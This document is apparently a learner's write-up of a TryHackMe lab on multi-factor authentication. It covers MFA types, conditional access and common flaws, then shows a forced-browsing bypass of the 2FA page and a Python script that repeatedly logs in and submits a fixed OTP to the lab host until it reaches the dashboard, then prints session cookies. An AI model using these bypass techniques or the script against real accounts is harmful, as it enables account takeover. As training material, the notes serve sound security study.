# Multi-Factor Authentication
-----
- URL: https://tryhackme.com/r/room/multifactorauthentications


## How MFA works
- MFA adds another layer of protection for authentication processes. 

### There are five types of MFA:
1. Something you know: passwords, PINs, security questions
2. Something you have: physical cards, badges, apps, security token, etc.
3. Something you are: this can be biometrics, fingerprints, retina scans, etc.
4. Somewhere you are: This is mostly based on your geolocation from where you try to authenticate/access the app.
5. Something you do: how you enter credentials, interact with the applications.

### 2FA authentication: 
- This is usually the next step after users enter their login usernames and passwords.
1. SMS: This is the most popular ways used nowadays. Users are sent a one-time code/password, which is only valid for a short period of time
2. Push notification: Some applications like Google will send notifications to your trusted devices when you try to log in. From there you can approve or deny the authentication.
3. Time-Based One-Time Passwords: Temporary passwords are randomly generated and only be valid for about 30s.
4. Hardware tokens: There are several physical that generate one time passwords of use NFC for authentication.

### Conditional Access
- Many companies use conditional access to adjust the authentication processes based on different scenarios.
1. Location-based: If users log in from an unsual location, they may be prompted more security measures to ensure their authentications.
2. Time-Based: This is based on the regular times on which users log onto. If an employee logs on his/her computer outside of work hours, that may raise some flags.
3. Behavior Analysis: This is based on the activities users do on the apps (accessing sensitive data, mass modifying data, etc.)
4. Device-specific: If users authenticate on differnt devices (which corresponds to different MAC address and IP address), they may be prompted more steps to authenticate themselves.

### Implementations and Applications
- **Banking:** By using MFA, banks can protect users' personal and financial information from cyber theft, fraud and other online threats.
- **Healthcare:** MFA makes sure that patient records and personal health information are only accessible by authorized persons.
- **Corporate IT:** Companies also implement MFA to prtect their business data and maitain system integrity.

### Common vulnerabilities
**Weak OTP Generaion Algorithms**
- If the algorithm is weak, it is easy for attackers to predict the patterns and guess the code
**Application leaking 2FA Token**
- Due to insecure coding, some applications may expose the 2FA code on the client sides, which can be taken advantage of by the attackers.
- Due to flaw logics, the attackers may bypass the 2FA mechanism, hence accessing sensitive information. We've seen a lot of applications that allows users to authenticate without entering the code (even though the 2FA pages are prompted)
**Brute Forcing the OTP**
- When an application does not have rate limiting, meaning locking out accounts after a certain number of failed attempts, attackers can easily bruteforce the code. Since most security code nowadays are only 6 digits, hitting the correct one should take no time for attackers.

### Practical - OTP Leakage
- XHR (XMLHttpRequest) is the main protocol used for the communications between the servers and clients, which includes MFA code. 
- Due to insecure coding or logic flaws, the applications expose the requests to the users, hence revealing the MFA codes.
- Hence, it is worth checking out the network tabs to see what the list of all requests and responses of the applications. If lucky, one might spot an XHR request which includes the 2FA code.

### Insecure Coding
- A lot of applications allow users to access resources without having the users to input the 2FA codes (even though they are prompted). This is due to the logic flaws in the applications.
- In the following example, after entering the credentials, we're prompted to enter 2FA codes. Since we know the url of the resource (/dashboard), we can try a GET request to `http://mfa.thm/labs/second/dashboard` 
- As expected, we get access to the dashboard without knowing what the security code is

## Brute Force OTP
- Depending on the applications, we can write a Python script to brutefore the OTP
- Here is an example of what the script looks like

```python
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```

- The script helps us log in once it finds the correct 2FA codes, which in return prints out the session cookie. We can use this cookie to log in.
